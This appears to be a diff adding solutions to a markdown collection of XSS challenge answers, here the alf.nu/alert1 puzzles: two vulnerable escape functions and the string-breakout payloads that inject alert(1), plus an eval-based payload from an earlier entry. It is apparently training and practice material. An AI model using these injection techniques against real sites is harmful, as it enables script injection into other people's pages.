@@ -58,3 +58,34 @@ function escape(input) {
 ```js
 <script>eval.call`${'prompt\x281\x29'}`</script>
 ```
+
+# alf.nu/alert1
+
+-Task
+
+```js
+function escape(s) {
+  return '<script>console.log("'+s+'");</script>';
+}
+```
+
+-Solution
+
+```js
+"); alert(1) //
+```
+
+-Task
+
+```js
+function escape(s) {
+  s = s.replace(/"/g, '\\"');
+  return '<script>console.log("' + s + '");</script>';
+}
+```
+
+- Solution
+
+```js
+\"); alert(1) //
+```
